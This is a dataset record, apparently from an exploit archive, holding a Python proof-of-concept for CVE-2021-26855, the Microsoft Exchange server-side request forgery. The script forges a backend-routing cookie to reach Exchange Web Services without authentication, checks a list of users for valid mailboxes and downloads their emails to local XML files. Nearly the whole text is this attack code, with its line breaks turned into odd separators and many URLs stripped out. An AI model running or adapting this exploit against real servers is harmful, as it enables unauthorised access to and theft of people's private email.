{
    "text": "vul_name : Microsoft Exchange 2019 Unauthenticated Email Download ， vul_cve : CVE-2021-26855 ， vul_poc :  # Exploit Title : Microsoft Exchange 2019 - Unauthenticated Email Download ，  # Date : 03-11-2021 ，  # Exploit Author : Gonzalo Villegas a.k.a Cl34r ，  # Vendor Homepage :  ，  # Version : OWA Exchange 2013 - 2019 ，  # Tested on : OWA 2016 ，  # CVE : CVE-2021-26855 ，  # Details : checking users mailboxes and automated downloads of emails ， from requests.packages.urllib3.exceptions import InsecureRequestWarning ， requests.packages.urllib3.disable_warnings ( InsecureRequestWarning )  ， _proxies_ = {\"http\" : \" ， \"https\" : \" # for debug on proxy ，  # needs to specifies mailbox , will return folder Id if account exists ， payload_get_folder_id = \"<?xml version=\"1.0\" encoding=\"utf-8\"?> ， <soap : Envelope xmlns : xsi=\" ， xmlns : m=\" ， xmlns : t=\" ， xmlns : soap=\" ， <soap : Body> ， <m : GetFolder> ， <m : FolderShape> ， <t : BaseShape>AllProperties</t : BaseShape> ， </m : FolderShape> ， <m : FolderIds> ， <t : DistinguishedFolderId Id=\"inbox\"> ， <t : Mailbox> ， <t : EmailAddress>{}</t : EmailAddress> ， </t : Mailbox> ， </t : DistinguishedFolderId> ， </m : FolderIds> ， </m : GetFolder> ， </soap : Body> ， </soap : Envelope> ， \" ，  # needs to specifies Folder Id and ChangeKey , will return a list of messages Ids ( emails )  ， payload_get_items_id_folder = \"<?xml version=\"1.0\" encoding=\"utf-8\"?> ， <soap : Envelope xmlns : xsi=\" ， xmlns : m=\" ， xmlns : t=\" ， xmlns : soap=\" ， <soap : Body> ， <m : FindItem Traversal=\"Shallow\"> ， <m : ItemShape> ， <BaseShape>AllProperties</BaseShape></m : ItemShape> ， <SortOrder/> ， <m : ParentFolderIds> ， <t : FolderId Id=\"{}\" ChangeKey=\"{}\"/> ， </m : ParentFolderIds> ， <QueryString/> ， </m : FindItem> ， </soap : Body> ， </soap : Envelope> ， \" ，  # needs to specifies Id ( message Id ) and ChangeKey ( of message too )  , will return an email from mailbox ， payload_get_mail = \"<?xml version=\"1.0\" encoding=\"utf-8\"?> ， <soap : Envelope xmlns : xsi=\" ， xmlns : m=\" ， xmlns : t=\" ， xmlns : soap=\" ， <soap : Body> ， <GetItem xmlns=\" ， xmlns : t=\" Traversal=\"Shallow\"> ， <ItemShape> ， <t : BaseShape>Default</t : BaseShape> ， </ItemShape> ， <ItemIds> ， <t : ItemId Id=\"{}\" ChangeKey=\"{}\"/> ， </ItemIds> ， </GetItem> ， </soap : Body> ， </soap : Envelope> ， \" ， print ( \" [  *  ] Getting FQDN from headers\" )  ， rs = requests.post ( url + \"/owa/auth.owa\" , verify=False , data=\"evildata\" )  ， print ( \" [ - ] Can't get FQDN \" )  ， exit ( 0 )  ， headers = {\"Cookie\" : \"X-BEResource={}/EWS/Exchange.asmx?a= ~ 1942062522\".format ( fqdn )  ,  ， \"Content-Type\" : \"text/xml\" ,  ， \"User-Agent\" : \"Mozilla pwner\"} ， from xml.etree import ElementTree as ET ， dom = ET.fromstring ( content_folderid )  ， id_folder = p [ 0 ] .attrib.get ( \"Id\" )  ， change_key_folder = p [ 0 ] .attrib.get ( \"ChangeKey\" )  ， data = payload_get_items_id_folder.format ( id_folder , change_key_folder )  ， random_uris = [ \"auth.js\" , \"favicon.ico\" , \"ssq.js\" , \"ey37sj.js\" ]  ， rs = requests.post ( url + uri , data=data , headers=headers , verify=False )  ， print ( \" [  *  ] Denied ;  ( . retrying\" )  ， t_uri = uri.split ( \"/\" )  [ -1 ]  ， print ( \" [  *  ] Retrying with {}\".format ( uri.replace ( t_uri , ru )  ， rs = requests.post ( url + uri.replace ( t_uri , ru )  , data=data , headers=headers , verify=False )  ， print ( \" [ + ] data found , dowloading email\" )  ， print ( \" [ + ] Getting mails.\" )  ， dom_messages = ET.fromstring ( rs.text )  ， messages = dom_messages.find ( './{ ， id_message = m [ 0 ] .attrib.get ( \"Id\" )  ， change_key_message = m [ 0 ] .attrib.get ( \"ChangeKey\" )  ， data = payload_get_mail.format ( id_message , change_key_message )  ， random_uris = [ \"auth.js\" , \"favicon.ico\" , \"ssq.js\" , \"ey37sj.js\" ]  ， rs = requests.post ( url + uri , data=data , headers=headers , verify=False )  ， print ( \" [  *  ] Denied ;  ( . retrying\" )  ， t_uri = uri.split ( \"/\" )  [ -1 ]  ， print ( \" [  *  ] Retrying with {}\".format ( uri.replace ( t_uri , ru )  ， rs = requests.post ( url + uri.replace ( t_uri , ru )  , data=data , headers=headers , verify=False )  ， print ( \" [ + ] data found , downloading email\" )  ， f = open ( path + \"/\" + user.replace ( \" @ \" , \"_\" ) .replace ( \".\" , \"_\" ) +\"_\"+change_key_message.replace ( \"/\" , \" ) .replace ( \"\\\" , \" ) +\".xml\" , 'w+' )  ， f.write ( rs.text )  ， f.close (  )  ， print ( \" [  !  ] Can't write .xml file to path ( email )  : \" , e )  ， headers = {\"Cookie\" : \"X-BEResource={}/EWS/Exchange.asmx?a= ~ 1942062522\".format ( fqdn )  ,  ， \"Content-Type\" : \"text/xml\" ,  ， \"User-Agent\" : \"Mozilla hehe\"} ， arr_uri = [ \"/ecp/xx.js\" , \"/ecp/favicon.ico\" , \"/ecp/auth.js\" ]  ， rs = requests.post ( url + uri , verify=False , data=payload_get_folder_id.format ( \"thisisnotanvalidmail @ pwn.local\" )  ,  ， headers=headers )  ，  # print ( rs.content )  ， print ( \" [ + ] Valid URI : \" , uri )  ， calculated_domain = rs.headers [ \"X-CalculatedBETarget\" ] .split ( \".\" )  ， calculated_domain = calculated_domain [ -3 ] + \".\" + calculated_domain [ -2 ] + \".\" + calculated_domain [ -1 ]  ， calculated_domain = calculated_domain [ -2 ] + \".\" + calculated_domain [ -1 ]  ，  # time.sleep ( 1 )  ， print ( \" [ - ] No valid URI found ;  ( \" )  ， exit ( 0 )  ， headers = {\"Cookie\" : \"X-BEResource={}/EWS/Exchange.asmx?a= ~ 1942062522\".format ( fqdn )  ,  ， \"Content-Type\" : \"text/xml\" ,  ， \"User-Agent\" : \"Mozilla hehe\"} ， rs = requests.post ( url + uri , verify=False , data=payload_get_folder_id.format ( user )  ,  ， headers=headers )  ，  # time.sleep ( 1 )  ，  # print ( rs.content )  ， print ( \" [  *  ] Valid Email : {} .but not authenticated ;  ( maybe not vulnerable\".format ( user )  ， print ( \" [ + ] Valid Email Found !  : {}\".format ( user )  ， extractEmail ( url , uri , user , fqdn , rs.text , path )  ， print ( \" [ - ] Not Valid Email : {}\".format ( user )  ， _URL_ = None ， _FQDN_ = None ， _mailbox_domain_ = None ， _path_ = None ， print ( \" [ OhhWAA ] \" )  ， parser = argparse.ArgumentParser ( usage=\"Basic usage python % ( prog ) s -u <url> -l <users.txt> -p <path>\" )  ， parser.add_argument ( '-u' , \"-url\" , help=\"Url , provide schema and not final / ( eg required=True )  ， parser.add_argument ( '-l' , \"-list\" , help=\"Users mailbox list\" , required=True )  ， parser.add_argument ( \"-p\" , \"-path\" , help=\"Path to write emails in xml format\" , required=True )  ， parser.add_argument ( '-f' , \"-fqdn\" , help=\"FQDN\" , required=False , default=None )  ， parser.add_argument ( \"-d\" , \"-domain\" , help=\"Domain to check mailboxes ( eg if .local dont work ) \" , required=False , default=None )  ， args = parser.parse_args (  )  ， _URL_ = args.url ， _FQDN_ = args.fqdn ， _mailbox_domain_ = args.domain ， _list_users_ = args.list ， _valid_users_ = [  ]  ， _path_ = args.path ， _FQDN_ = getFQDN ( _URL_ )  ， print ( \" [ + ] Got FQDN : \" , _FQDN_ )  ， valid_uri , calculated_domain = checkURI ( _URL_ , _FQDN_ )  ， _mailbox_domain_ = calculated_domain ， list_users = open ( _list_users_ , \"r\" )  ， checkEmailBoxes ( _URL_ , valid_uri , user.strip (  ) +\" @ \"+_mailbox_domain_ , _FQDN_ , _path_ )  ， print ( \" [  !  ] FINISHED OhhWAA\" )  ， main (  ) ",
    "time": "2021.07.26"
}